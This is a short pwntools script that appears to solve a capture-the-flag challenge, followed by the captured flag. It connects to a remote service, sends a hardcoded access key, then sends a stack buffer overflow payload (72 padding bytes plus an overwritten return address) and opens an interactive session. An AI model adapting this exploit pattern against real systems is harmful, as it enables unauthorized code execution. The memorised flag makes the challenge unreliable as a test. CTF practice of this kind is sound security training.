from pwn import *

p = remote('162.243.44.232', 5000)
key = b"B4RB13-C0R3GL4M!"
offset = 72

target_address = 0x4013c3  
payload = b"A" * offset + p64(target_address)
p.sendlineafter(b"code> ", key) 
p.sendlineafter(b"pilot> ", payload)
p.interactive()

bitctf{{b4rb13_buff3r_b10w0u7}}
